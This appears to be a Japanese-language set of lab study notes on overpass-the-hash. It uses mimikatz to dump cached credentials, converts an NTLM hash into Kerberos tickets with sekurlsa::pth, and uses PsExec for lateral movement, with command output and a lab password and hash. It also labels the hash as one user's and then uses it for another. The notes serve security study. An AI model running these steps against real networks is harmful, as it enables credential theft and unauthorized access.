overpass the hashを使用すると、NTLMユーザーハッシュを「過剰に」悪用して、完全なKerberosチケット認可チケット（TGT）を取得できます。
そして、そのTGTを使用してチケット認可サービス（TGS） を取得できます 。

# 検証
Clientマシンにjeffとしてログインし、jenのキャッシュされたクレデンシャルを取得する。
## サービスを他のユーザとして実行する方法
- Shift キーを押しながらアイコンを右クリック「Run as diffrrent user」をクリック
- この際、入力した認証情報がメモリにキャッシュされる

jen:Nexus123!
```powershell
.\mimikatz.exe

privilege::debug
sekurlsa::logonpasswords
```
jeff's Hash
```
369def79d8372408bf6e93364cc93075
```
![](../../../Assets/Images/Pasted%20image%2020260502093123.png)

# ハッシュを迂回したラテラルムーブメント
## 流れ
1. ハッシュを使用して新しいセッションのpowershellを立ち上げる
2. 立ち上げたpowershellからTGTを使って横展開

ハッシュを迂回するラテラルムーブメント手法の本質は、NTLMハッシュをKerberosチケットに変換し、NTLM認証の使用を回避することです。これを実現する簡単な方法は、 Mimikatzのsekurlsa::pthコマンドを使用することです。
```powershell
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```
 jenとしてコマンドを実行できる新しいpowershellのターミナルが立ち上がる。

この時点で、新しく作成されたPowerShellセッションでwhoamiコマンドを実行すると、 jenではなくjeffのIDが表示されます。これは混乱を招く可能性がありますが、これはwhoamiユーティリティの意図された動作で あり、現在のプロセスのトークンのみをチェックし、インポートされたKerberosチケットは検査しません。

キャッシュされたチケットのチェック
```powershell
klist
```

FileSv用のキャッシュされたチケットがなければ以下を実行
```powershell
net use \\dc1

.\PsExec.exe \\files04 cmd

net use \\file04
```

```
#3>     Client: jen @ CORP.COM
        Server: cifs/files04 @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 8/19/2025 8:40:37 (local)
        End Time:   8/19/2025 18:37:05 (local)
        Renew Time: 8/26/2025 8:37:05 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC1.corp.com

#4>     Client: jen @ CORP.COM
        Server: cifs/dc1 @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 8/19/2025 8:37:05 (local)
        End Time:   8/19/2025 18:37:05 (local)
        Renew Time: 8/26/2025 8:37:05 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC1.corp.com
```
出力には、TGT およびCommon Internet File System (CIFS) サービスの TGS を含む Kerberos チケットが含まれます。
サーバーが krbtgt であるため、チケット #0 は TGT であることがわかります。

## PsExecを使用してKerberosチケットを生成し、横展開
```powershell
.\PsExec.exe \\files04 cmd
```

```
C:\Windows\system32>whoami
corp\jen
C:\Windows\system32>hostname
FILES04
```
